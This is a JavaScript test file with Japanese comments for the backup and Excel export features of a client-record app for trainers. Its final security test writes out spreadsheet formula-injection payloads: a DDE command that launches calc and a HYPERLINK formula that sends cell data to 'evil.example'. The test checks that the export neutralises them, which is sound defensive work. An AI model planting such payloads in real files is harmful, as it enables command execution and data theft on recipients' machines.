import 'fake-indexeddb/auto';
import { test, describe, beforeEach } from 'node:test';
import assert from 'node:assert/strict';
import { installDom, installXlsx } from './setup/dom-env.js';

const dom = installDom();
installXlsx(dom); // 実物のSheetJS(xlsx.core.min.js)を読み込み、グローバル XLSX を生やす

// download() は <a>.click() でファイル保存を発火する。jsdomは実ナビゲーション
// を持たないため click() を差し替えて「何がダウンロードされようとしたか」を記録する。
const downloads = [];
window.HTMLAnchorElement.prototype.click = function () {
  downloads.push({ href: this.href, download: this.download });
};

const { db } = await import('../js/data/adapter.js');
const { newClient, saveClient, createChart } = await import('../js/store.js');
const { exportAll, importFile, exportClientXlsx } = await import('../js/export.js');

function fakeFile(obj) {
  const text = JSON.stringify(obj);
  return { text: async () => text };
}
beforeEach(async () => {
  await db.clear('clients');
  await db.clear('charts');
  downloads.length = 0;
});

describe('export.js: JSONバックアップ（全データ）', () => {
  test('exportAll: 全クライアント・全カルテをまとめて書き出す', async () => {
    const c1 = newClient({ name: 'A' });
    const c2 = newClient({ name: 'B' });
    await saveClient(c1);
    await saveClient(c2);
    await createChart(c1.id, 'karte');
    const filename = await exportAll();
    assert.ok(filename.startsWith('karte_backup_'));
    assert.ok(filename.endsWith('.json'));
    assert.equal(downloads.length, 1);
    assert.match(downloads[0].href, /^blob:/);
  });

  test('importFile: マージで読み込める', async () => {
    const backup = {
      format: 'pt-karte-backup', version: 1, kind: 'all',
      clients: [newClient({ id: 'c1', name: '復元太郎' })],
      charts: [],
    };
    const result = await importFile(fakeFile(backup), { merge: true });
    assert.equal(result.clients, 1);
    assert.equal(result.charts, 0);
    assert.equal((await db.get('clients', 'c1')).name, '復元太郎');
  });

  test('importFile: merge=false は既存データを消してから読み込む', async () => {
    await saveClient(newClient({ name: '既存太郎' }));
    const backup = {
      format: 'pt-karte-backup', version: 1, kind: 'all',
      clients: [newClient({ id: 'c2', name: '新規花子' })],
      charts: [],
    };
    await importFile(fakeFile(backup), { merge: false });
    const all = await db.getAll('clients');
    assert.equal(all.length, 1);
    assert.equal(all[0].name, '新規花子');
  });

  test('importFile: 対応していない形式・不明なkindは例外', async () => {
    await assert.rejects(() => importFile(fakeFile({ format: 'other' })), /対応していないファイル形式/);
    await assert.rejects(
      () => importFile(fakeFile({ format: 'pt-karte-backup', kind: 'client' })),
      /不明なバックアップ種別/
    );
  });
});

describe('export.js: Excel書き出し（基本情報/カウンセリングシート/同意書/カルテ）', () => {
  let capturedBlob;
  beforeEach(() => {
    capturedBlob = null;
    window.URL.createObjectURL = (blob) => {
      capturedBlob = blob;
      return 'blob:mock-xlsx';
    };
  });

  async function readSheets(client) {
    await exportClientXlsx(client);
    const buf = await capturedBlob.arrayBuffer();
    const wb = XLSX.read(new Uint8Array(buf), { type: 'array' });
    return wb;
  }

  test('4シート（基本情報/カウンセリングシート/同意書/カルテ）で構成される', async () => {
    const c = newClient({ name: '山田太郎', kana: 'ヤマダ' });
    await saveClient(c);
    const wb = await readSheets(c);
    assert.deepEqual([...wb.SheetNames], ['基本情報', 'カウンセリングシート', '同意書', 'カルテ']);
  });

  test('基本情報シートに顧客データ（会員ID・緊急連絡先・かかりつけ医を含む）が入る', async () => {
    const c = newClient({
      name: '山田太郎', kana: 'ヤマダ', goal: '減量5kg', memberId: 'M00042',
      emergencyName: '山田花子', emergencyRelation: '配偶者', emergencyPhone: '09011112222',
      doctor: '〇〇病院',
    });
    await saveClient(c);
    const wb = await readSheets(c);
    const rows = XLSX.utils.sheet_to_json(wb.Sheets['基本情報'], { header: 1 });
    assert.ok(rows.some((r) => r[0] === '会員ID' && r[1] === 'M00042'));
    assert.ok(rows.some((r) => r[0] === '氏名' && r[1] === '山田太郎'));
    assert.ok(rows.some((r) => r[0] === '目標' && r[1] === '減量5kg'));
    assert.ok(rows.some((r) => r[0] === '緊急連絡先（氏名）' && r[1] === '山田花子'));
    assert.ok(rows.some((r) => r[0] === '緊急連絡先（続柄）' && r[1] === '配偶者'));
    assert.ok(rows.some((r) => r[0] === '緊急連絡先（電話）' && r[1] === '09011112222'));
    assert.ok(rows.some((r) => r[0] === 'かかりつけ医・病院' && r[1] === '〇〇病院'));
  });

  test('未作成のカウンセリング/同意書は案内メッセージになる', async () => {
    const c = newClient({ name: '未作成太郎' });
    await saveClient(c);
    const wb = await readSheets(c);
    const cRows = XLSX.utils.sheet_to_json(wb.Sheets['カウンセリングシート'], { header: 1 });
    const pRows = XLSX.utils.sheet_to_json(wb.Sheets['同意書'], { header: 1 });
    assert.match(cRows[0][0], /未作成/);
    assert.match(pRows[0][0], /未作成/);
  });

  test('カウンセリングシートの入力値がシートに反映される', async () => {
    const c = newClient({ name: '入力太郎' });
    await saveClient(c);
    const ch = await createChart(c.id, 'counseling');
    const goalPage = ch.pages.find((p) => p.name === '目標・運動歴');
    goalPage.values.mainGoal = 'スクワット100kg';
    await (await import('../js/store.js')).saveChart(ch);

    const wb = await readSheets(c);
    const rows = XLSX.utils.sheet_to_json(wb.Sheets['カウンセリングシート'], { header: 1 });
    assert.ok(rows.some((r) => r[0] === '主な目標' && r[1] === 'スクワット100kg'));
  });

  test('カルテは記入日の見出しで複数件並び、テーブル項目も展開される', async () => {
    const c = newClient({ name: '複数太郎' });
    await saveClient(c);
    const ch1 = await createChart(c.id, 'karte', '2026-01-01');
    const menuPage = ch1.pages.find((p) => p.name === 'メニュー・測定記録');
    menuPage.values.items = [{ name: 'ベンチプレス', value: '60kg', reps: '10x3', note: '' }];
    await (await import('../js/store.js')).saveChart(ch1);
    await createChart(c.id, 'karte', '2026-01-02');

    const wb = await readSheets(c);
    const rows = XLSX.utils.sheet_to_json(wb.Sheets['カルテ'], { header: 1 });
    assert.ok(rows.some((r) => r[0] === '記入日: 2026-01-02'));
    assert.ok(rows.some((r) => r[0] === '記入日: 2026-01-01'));
    assert.ok(rows.some((r) => r[0] === 'ベンチプレス' && r[1] === '60kg'));
  });

  test('署名フィールドは「署名あり/未署名」に変換される', async () => {
    const c = newClient({ name: '署名太郎' });
    await saveClient(c);
    const ch = await createChart(c.id, 'precautions');
    const page = ch.pages.find((p) => p.name === '免責・キャンセルポリシー');
    page.values.signature = [{ tool: 'pen', color: '#000', width: 0.01, points: [[0, 0, 0.5]] }];
    await (await import('../js/store.js')).saveChart(ch);

    const wb = await readSheets(c);
    const rows = XLSX.utils.sheet_to_json(wb.Sheets['同意書'], { header: 1 });
    assert.ok(rows.some((r) => r[0] === '本人署名' && r[1] === '署名あり'));
  });

  test('ファイル名にはクライアント名の安全化された文字列が入る', async () => {
    const c = newClient({ name: '山田/太郎:テスト?' });
    await saveClient(c);
    const filename = await exportClientXlsx(c);
    assert.ok(filename.endsWith('.xlsx'));
    assert.doesNotMatch(filename, /[/:?]/);
  });

  test('セキュリティ: "=" 等で始まる値は数式として解釈されないよう無害化される', async () => {
    const c = newClient({ name: '山田太郎', memo: '=cmd|"/c calc"!A1' });
    await saveClient(c);
    const ch = await createChart(c.id, 'karte');
    const page = ch.pages.find((p) => p.name === '本日の記録');
    page.values.memo = '+HYPERLINK("http://evil.example/steal?d="&A1)';
    const menuPage = ch.pages.find((p) => p.name === 'メニュー・測定記録');
    menuPage.values.items = [{ name: '-2+3+cmd', value: '@SUM(1)', reps: '', note: '' }];
    await (await import('../js/store.js')).saveChart(ch);

    const wb = await readSheets(c);
    const infoRows = XLSX.utils.sheet_to_json(wb.Sheets['基本情報'], { header: 1 });
    const memoRow = infoRows.find((r) => r[0] === '備考');
    assert.equal(memoRow[1], "'=cmd|\"/c calc\"!A1");
    assert.ok(!memoRow[1].startsWith('=cmd'));

    const karteRows = XLSX.utils.sheet_to_json(wb.Sheets['カルテ'], { header: 1 });
    assert.ok(karteRows.some((r) => r[1] === "'+HYPERLINK(\"http://evil.example/steal?d=\"&A1)"));
    assert.ok(karteRows.some((r) => r[0] === "'-2+3+cmd"));
    assert.ok(karteRows.some((r) => r[1] === "'@SUM(1)"));

    // セルの実体が数式(f)ではなく文字列(s)として保存されていることも確認する
    const sheet = wb.Sheets['基本情報'];
    const memoCellRef = Object.keys(sheet).find((k) => sheet[k].v === "'=cmd|\"/c calc\"!A1");
    assert.equal(sheet[memoCellRef].t, 's');
    assert.equal(sheet[memoCellRef].f, undefined);
  });
});
